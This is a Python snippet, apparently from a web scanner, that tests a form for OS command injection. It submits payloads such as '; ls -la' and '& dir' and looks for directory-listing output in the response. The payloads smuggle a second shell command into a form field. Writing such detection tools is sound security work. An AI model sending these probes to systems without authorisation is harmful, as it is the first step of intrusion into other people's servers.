from typing import List, Tuple

PAYLOADS = {
    # Bash / SH
    "; ls -la",
    "& ls -la",
    "&& ls -la",
    "| ls -la",
    "|| ls -la",
    # CSH
    "; ls -la",
    "& ls -la",
    "| ls -la",
    # Windows
    "& dir",
}

ANSWERS = {"total",
           "root",
           "Directory of"}


def test_command_execution_in_form(self, form: str, url: str) -> List[Tuple[bool, str]]:
    """
    Test for command execution vulnerabilities in a web form.

    This function submits various payloads that could potentially execute shell commands on a server
    if the input is not properly sanitized. After each submission, it checks the response for a specified prefix.
    If the prefix is found in the response, the corresponding payload is added to the results.

    Args:
        form (str): The web form to test.
        url (str): The URL to submit the form to.

    Returns:
        List[Tuple[bool, str]]: A list of tuples. Each tuple contains a boolean indicating whether the prefix was found in the response,
                                 and the payload that was used.
    """
    results = []
    for answer in ANSWERS:
        for payload in PAYLOADS:

            # Check payload without escaping characters
            response = self.submit_form(form=form, value=payload, url=url)
            if answer in response.text:
                results.append((True, payload))

            # Check payload with escaping characters
            escaped_payload = payload.replace(" ", "%20")
            response = self.submit_form(form=form, value=escaped_payload, url=url)
            if answer in response.text:
                results.append((True, escaped_payload))

    return [result for result in results if result[0]]


